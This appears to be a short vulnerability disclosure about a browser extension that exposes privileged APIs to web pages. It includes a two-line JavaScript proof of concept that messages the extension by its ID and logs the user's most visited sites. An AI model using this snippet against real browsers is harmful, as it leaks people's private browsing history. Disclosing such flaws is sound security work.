This extension gives web applications access to privileged APIs: storage, cookies

a website can do this to expose browsing history:

> window.addEventListener("message", function(msg) { JSON.parse(msg.data).data.forEach(function(a) { console.log(a.title, a.url);}) })
> window.postMessage(JSON.stringify({destination: "mallpejgeafdahhflmliiahjdpgbegpk", cmd: "mostVisitedSites"}), "*")
